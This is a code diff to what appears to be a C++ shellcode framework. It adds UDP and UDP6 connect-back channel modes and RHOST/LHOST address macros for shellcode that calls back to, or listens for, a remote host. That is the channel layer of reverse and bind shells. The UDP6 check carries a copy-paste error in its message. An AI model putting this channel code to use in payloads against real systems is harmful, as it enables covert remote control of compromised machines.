@@ -20,6 +20,8 @@ namespace Shellcode {
     #define SCTP_LISTEN     7
     #define SCTP6_CONNECT   8
     #define SCTP6_LISTEN    9
+    #define UDP_CONNECT     10
+    #define UDP6_CONNECT    11
 
     //
     // Static structure holding information for each mode.
@@ -44,6 +46,8 @@ namespace Shellcode {
     DEFINE_CHANNEL_MODE(SCTP6_CONNECT,  Network::Sctp6Socket);
     DEFINE_CHANNEL_MODE(SCTP_LISTEN,    Network::SctpSocket);
     DEFINE_CHANNEL_MODE(SCTP6_LISTEN,   Network::Sctp6Socket);
+    DEFINE_CHANNEL_MODE(UDP_CONNECT,    Network::UdpSocket);
+    DEFINE_CHANNEL_MODE(UDP6_CONNECT,   Network::Udp6Socket);
 
     //
     // The channel class definition.
@@ -56,6 +60,10 @@ namespace Shellcode {
 
         template <enum Network::AddressType T>
         CONSTRUCTOR Channel(Network::Address<T> addr, uint16_t port);
+
+        template <enum Network::AddressType T>
+        CONSTRUCTOR Channel(Network::Address<T> laddr, uint16_t lport,
+                            Network::Address<T> raddr, uint16_t rport);
     };
 
     template<>
@@ -67,6 +75,26 @@ namespace Shellcode {
     CONSTRUCTOR
     Channel<USE_STDERR>::Channel() :
         ChannelMode<USE_STDERR>::stream_type(Stdio::input(), Stdio::error()) {}
+
+    template <>
+    template <enum Network::AddressType T>
+    CONSTRUCTOR
+    Channel<UDP_CONNECT>::Channel(Network::Address<T> laddr, uint16_t lport, Network::Address<T> raddr, uint16_t rport)
+    {
+        static_assert(T == Network::IPV4, "UDP_CONNECT requires an IPV4 address.");
+        bind(laddr, lport);
+        connect(raddr, rport);
+    }
+
+    template <>
+    template <enum Network::AddressType T>
+    CONSTRUCTOR
+    Channel<UDP6_CONNECT>::Channel(Network::Address<T> laddr, uint16_t lport, Network::Address<T> raddr, uint16_t rport)
+    {
+        static_assert(T == Network::IPV6, "UDP6_CONNECT requires an IPV4 address.");
+        bind(laddr, lport);
+        connect(raddr, rport);
+    }
 
     template <>
     template <enum Network::AddressType T>
@@ -170,17 +198,41 @@ namespace Options {
 
         // Connect-back channels require a remote address/port.
         #elif (CHANNEL == TCP_CONNECT) || (CHANNEL == TCP6_CONNECT) || (CHANNEL == SCTP_CONNECT) || (CHANNEL == SCTP6_CONNECT)
-            auto remote_address = Pico::Network::ip_address_from_bytes(HOST);
-            uint16_t remote_port = PORT;
+            // Can use HOST/PORT instead of RHOST/RPORT.
+            #ifndef RHOST
+            #define RHOST HOST
+            #endif
+            #ifndef RPORT
+            #define RPORT PORT
+            #endif
+
+            auto remote_address = Pico::Network::ip_address_from_bytes(RHOST);
+            uint16_t remote_port = RPORT;
 
             return SelectedChannel(remote_address, remote_port);
 
         // Listen channels require a local address/port.
         #elif (CHANNEL == TCP_LISTEN) || (CHANNEL == TCP6_LISTEN) || (CHANNEL == SCTP_LISTEN) || (CHANNEL == SCTP6_LISTEN)
-            auto local_address = Pico::Network::ip_address_from_bytes(HOST);
-            uint16_t local_port = PORT;
+            // Can use HOST/PORT instead of LHOST/LPORT.
+            #ifndef LHOST
+            #define LHOST HOST
+            #endif
+            #ifndef LPORT
+            #define LPORT PORT
+            #endif
+
+            auto local_address = Pico::Network::ip_address_from_bytes(LHOST);
+            uint16_t local_port = LPORT;
 
             return SelectedChannel(local_address, local_port);
+
+        #elif (CHANNEL == UDP_CONNECT) || (CHANNEL == UDP6_CONNECT)
+            auto local_address = Pico::Network::ip_address_from_bytes(LHOST);
+            uint16_t local_port = LPORT;
+            auto remote_address = Pico::Network::ip_address_from_bytes(RHOST);
+            uint16_t remote_port = RPORT;
+
+            return SelectedChannel(local_address, local_port, remote_address, remote_port);
 
         #else
         #error "No channel mode is selected."
